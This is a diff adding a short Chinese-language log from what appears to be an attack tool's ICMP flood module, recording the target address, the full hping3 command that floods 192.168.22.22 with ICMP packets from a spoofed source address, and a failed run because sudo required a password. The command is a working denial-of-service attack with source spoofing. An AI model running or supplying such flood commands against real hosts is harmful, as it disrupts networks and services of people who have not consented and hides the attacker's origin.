@@ -1,0 +1,12 @@
+模組：icmp_flood
+目標IP：192.168.22.22
+封包數：-1
+結果：可能失敗
+時間：20250625_205828
+
+[hping3] 發動 ICMP 攻擊至 192.168.22.22，模式：Flood
+[hping3] 執行指令：sudo hping3 192.168.22.22 --icmp -a 192.168.182.25 --flood
+[hping3] 收到停止請求，正在終止攻擊...
+[hping3] sudo: a password is required
+[hping3] 攻擊結束，返回碼：1
+[結果] 攻擊結果：可能失敗
